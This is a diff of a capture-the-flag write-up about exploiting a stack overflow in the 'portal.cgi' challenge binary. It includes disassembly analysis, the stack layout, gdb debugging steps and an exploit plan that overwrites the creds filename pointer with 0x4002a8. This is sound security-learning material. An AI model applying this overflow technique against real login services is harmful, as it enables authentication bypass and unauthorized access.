@@ -182,9 +182,9 @@ r2 -q -c "pd 125 @ main" cgi-bin/portal.cgi
 ### Analysis Summary for main()
 - env REQUEST_METHOD has to be **POST**
 - env CONTENT_LENGTH has to be less than 1024
-- parses HTTP POST BODY as JSON, find string pointers for *user* and *pass*
-- calls a supposed validate function @ 0x401226 with parsed JSON values for *user* and *pass* as arguments
-- if validate function returns 0, the flag is returned from the portal.cgi
+- Parses HTTP POST BODY as JSON, find string pointers for *user* and *pass*
+- Calls a supposed validate function @ 0x401226 with parsed JSON values for *user* and *pass* as arguments
+- If validate function returns 0, the flag is returned from the portal.cgi
 
 ### Portal CGI, Disassemble validate() @ 0x401226
 Use radare2 to disassemble function *main* of portal.cgi (output is shortened for readability and additionally commented with ;;)
@@ -292,91 +292,125 @@ r2 -q -c "pd 107 @ 0x401226" cgi-bin/portal.cgi
 
 ### Analysis Summary for validate()
 - fopen() of the *creds* file happens at 0x0040131a, using string pointer saved in local variable [rbp - 0x18] just **after** base64 decoding of user and pass
-- lines are read from the opened file that are either empty, newline terminated and < 256 bytes long or 256 bytes long
-- the currently read line is checked for an occurrence of a colon (":"); if not read next line
-- if this line is equal to base64_decoded_user + ":" + base64_decoded_pass, we got a match -> exit with value 0 (success) -> main will print FLAG (win!)
-
-
-- stack frame of validate is protected by a stack canary, so it's unlikely to overwrite the return pointer with a buffer overflow
-
-
+- Lines are read from the opened file that are either empty, newline terminated and < 256 bytes long or 256 bytes long
+- The currently read line is checked for an occurrence of a colon (":"); if not read next line
+- If this line is equal to base64_decoded_user + ":" + base64_decoded_pass, we got a match -> exit with value 0 (success) -> main will print FLAG (win!)
 
 ### Stack Layout of validate()
-parsing of server local creds.txt happens line by line, reading up to 100h bytes with fgets into var_220 + 4 (range variable from -21Ch up to -11Dh)
-b64 decoded username (up to 100h) bytes are saved to var_220 + 104 (range variable, from -11Ch up to -1Dh)
-then a colon is added to decoded username (with max username length, e.g. at -1Ch)
-b64 decoded password (up to 100h) bytes are saved to var_220 + 104 + strlen(username) + 1
-with max size username from -1B up to and beyond stack frame border.
+- [rbp - 0x220]: Local var that is checked for value 0 as winning condition
+- [rbp - 0x21c]: Current line from creds file, up to 256 bytes / [rbp - 0x11d]
+- [rbp - 0x11c]: Base64 decoded username, up to 256 bytes / [rbp - 0x1d]
+- [rbp - 0x11c + strlen(base64 decoded username) + 1]: Base64 decoded password, up to 256 bytes
+- [rbp - 0x18]: String pointer to filename to open for creds
+- [rbp - 0x8]: Stack canary
 
+### Attack Path Analysis
+- Base64 decoded username and password can be up to 513 bytes long, exceeding the stack distance to next local var (0x11c - 0x18 = 260 bytes)
+- Stack canary (and return pointer) could be overwritten, but the value of the canary is unknown, thus cheap stack smashing will be detected
+- So the only local variable that could sensibly be overwritten is the filename string pointer
+- For a reliable attack, there needs to be a string to a valid filename inside the non-ASLR region
 
-
-
-
-
+```
 rabin2 -zz cgi-bin/portal.cgi 
 [Strings]
 nth paddr      vaddr      len size section   type    string
 ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 0   0x00000034 0x00000034 5   12             utf16le @8\v@\e
 1   0x000002a8 0x004002a8 27  28   .interp   ascii   /lib64/ld-linux-x86-64.so.2
+[...]
+```
 
+Bingo! There's exactly one static valid filename string pointer other than **creds.txt** and that is **/lib64/ld-linux-x86-64.so.2** at non-ASLR address **0x004002a8**.
 
-strings -t x portal.cgi
-    2a8 /lib64/ld-linux-x86-64.so.2
+## Constructing the Exploit
+1) Find a colon seperated user:pass in /lib64/ld-linux-x86-64.so.2
+2) Data can be binary, as user and pass are transmitted in base64 encoding
+3) Pass should be expanded, e.g. with null bytes, so that strlen(user + ":" + pass) == 260 bytes
+4) Add 0x004002a8 in little endian to pass
+5) Base64 encode user and pass and fire them directly at the portal.cgi 
 
-LOAD:00000000004002A8 aLib64LdLinuxX8 db '/lib64/ld-linux-x86-64.so.2',0
+### Attempt 1 - The Fail...
+Most writeups are polished without documenting failures. But here's one of mine.
+While feeling somewhat clever, i thought:
+- Why not debug the CGI
+- Set breakpoint at function validate()
+- Manually patch the filename to be opened to /lib64/ld-linux-x86-64.so.2
+- Let CGI fgets the first line
+- Dump that and use it for the exploit
 
-nope: its the right way, only path in non-dynamic memory is
-fill up pass with \0 and then overwrite filename with offset $rax  : 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2"
+Find PID of local python webserver
+```
+ps auxwwg | grep server
+kali      486858  0.0  1.1  98440 17352 pts/0    S+   19:31   0:02 python3 -m http.server --cgi --bind 127.0.0.1
+```
 
--> goal: user:pass combo to overwrite filename offset with 0x00000000004002a8
-try with debug
+Attach with debugger of your choice
+```
+gdb -p 486858
+```
 
-ps auxwwg
-kali      741831  0.0  0.0   2416   372 pts/0    S+   20:16   0:00 /bin/sh ./run.sh
-kali      741832  0.0  0.9 245352 13628 pts/0    S+   20:16   0:01 python3 -m http.server --cgi --bind 127.0.0.1
-
-gdb -p 741832
-
+Follow child process on fork and set breakpoints
+```
 set follow-fork-mode child
 set detach-on-fork off
-b *0x401434     # main
-b *0x401226     # validate_creds (see i64)
-b *0x040131A    # fopen
+break *0x401226  # validate()
+break *0x40131A  # fopen()
+break *0x4013c9  # strcmp()
+continue
+```
 
+Send login data to portal.cgi with interactive python
+```python
+>>> import requests
+>>> from base64 import b64encode
+>>> import json
+>>> data = {}
+>>> data['user'] = b64encode(b"admin").decode('utf-8')
+>>> data['pass'] = b64encode(b"admin").decode('utf-8')
+>>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
+```
+
+Debugging
+```
+Thread 2.1 "portal.cgi" hit Breakpoint 1, 0x0000000000401226 in ?? () <- start of validate()
+gef➤  continue
+Continuing.
+
+Thread 2.1 "portal.cgi" hit Breakpoint 2, 0x000000000040131a in ?? () <- fopen()
+
+fopen@plt (
+   $rdi = 0x0000000000402008 → "creds.txt",
+   $rsi = 0x0000000000402012 → 0x6f43000000000072 ("r"?)
+)
+```
+Manually patch filename string pointer from 0x402008 to 0x4002a8
+```
+gef➤  set $rdi=0x004002a8
+gef➤  context
+fopen@plt (
+   $rdi = 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2",
+   $rsi = 0x0000000000402012 → 0x6f43000000000072 ("r"?)
+)
 gef➤  continue 
 Continuing.
-[New Thread 0x7fecaa6b6700 (LWP 743153)]
-[Attaching after Thread 0x7fecaa6b6700 (LWP 743153) fork to child process 743154]
-[New inferior 2 (process 743154)]
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Reading symbols from /usr/lib/debug/.build-id/2c/c4e3a93e8ef0f4dee8f77225701d988f97b9c7.debug...
-Reading symbols from /usr/lib/debug/.build-id/5b/d08b8a2b8511c50cc5e38aac39305cfcae72f0.debug...
-Reading symbols from /usr/lib/debug/.build-id/f5/efbcea815d5c6da19e62263f67ca63f8bedeb6.debug...
-Reading symbols from /usr/lib/debug/.build-id/e8/ef1ac73913c5833fc0088ea41bc3331db60ae2.debug...
-Reading symbols from /usr/lib/debug/.build-id/a5/a3c3f65fd94f4c7f323a175707c3a79cbbd614.debug...
-Reading symbols from /usr/lib/debug/.build-id/63/7706dbbbd112d03fbad61ca30125b48e60aa92.debug...
-Reading symbols from /usr/lib/debug/.build-id/a4/94b325fdefe9742c94fcd34c583c08733d2318.debug...
-process 743154 is executing new program: /mnt/hgfs/Crowdstrike-Adversary-Quest-2021/protective penguin/portal/authportal/cgi-bin/portal.cgi
-Reading symbols from /usr/lib/debug/.build-id/63/7706dbbbd112d03fbad61ca30125b48e60aa92.debug...
-Reading symbols from /usr/lib/debug/.build-id/97/0fa8cc35554ed6f4feb2d663067310d48cadb4.debug...
-Reading symbols from /usr/lib/debug/.build-id/a5/a3c3f65fd94f4c7f323a175707c3a79cbbd614.debug...
-[Switching to process 743154]
 
-Thread 2.1 "portal.cgi" hit Breakpoint 1, 0x0000000000401434 in ?? ()
+Thread 2.1 "portal.cgi" hit Breakpoint 3, 0x00000000004013c9 in ?? () <- strcmp()
 
-# first line read with fgets from /lib64/...
+strcmp@plt (
+   $rdi = 0x00007ffc87839384 → "admin:admin",
+   $rsi = 0x00007ffc87839284 → 0x013cb60f41f82948,
+   $rdx = 0x00007ffc87839284 → 0x013cb60f41f82948,
+   $rcx = 0x0000000000000004
+)
 
-00001420: 0348 8d3c 9248 01ff 4829 f841 0fb6 3c01  .H.<.H..H).A..<.
-00001430: 4889 c848 89d1 4188 3a48 83f8 0977 d14c  H..H..A.:H...w.L
-00001440: 89d8 ba19 0000 0049 89e3 4c29 d048 83f8  .......I..L).H..
+gef➤  x/29x $rsi
+0x7ffc87839284: 0x48    0x29    0xf8    0x41    0x0f    0xb6    0x3c    0x01
+0x7ffc8783928c: 0x48    0x89    0xc8    0x48    0x89    0xd1    0x41    0x88
+0x7ffc87839294: 0x3a    0x48    0x83    0xf8    0x09    0x77    0xd1    0x4c
+0x7ffc8783929c: 0x89    0xd8    0xba    0x19    0x00
+```
 
-gef➤  x/200x $rsi
-0x7ffde4289cd4: 0x48    0x29    0xf8    0x41    0x0f    0xb6    0x3c    0x01
-0x7ffde4289cdc: 0x48    0x89    0xc8    0x48    0x89    0xd1    0x41    0x88
-0x7ffde4289ce4: 0x3a    0x48    0x83    0xf8    0x09    0x77    0xd1    0x4c
-0x7ffde4289cec: 0x89    0xd8    0xba    0x19    0x00    0x00    0x00    0x49
+
 
 we have 16 chars for username, colon, and then 11 chars pass before first \0
 fill up pass with \0 and then overwrite filename with offset $rax  : 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2"
